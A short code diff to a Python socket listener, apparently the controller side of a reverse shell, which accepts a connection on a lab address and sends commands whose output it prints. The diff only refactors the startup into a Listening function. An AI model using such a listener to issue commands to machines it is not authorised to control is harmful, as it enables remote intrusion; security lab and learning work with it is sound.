@@ -6,7 +6,7 @@ class Socket_listener():
 	def __init__(self,ip,port):
 		my_listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 		my_listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-		my_listener.bind((ip,port))
+		my_listener.bind((f"{ip}",port))
 		my_listener.listen(0)
 		print("listening")
 		(self.my_connection,my_address) = my_listener.accept()
@@ -58,5 +58,7 @@ class Socket_listener():
 				command_output = "Error !"
 			
 			print(command_output)
-my_con = Socket_listener("10.0.2.4",4545)
-my_con.sencommand()
+
+def Listening(ip,port):
+	my_con = Socket_listener(ip,port)
+	my_con.sencommand()
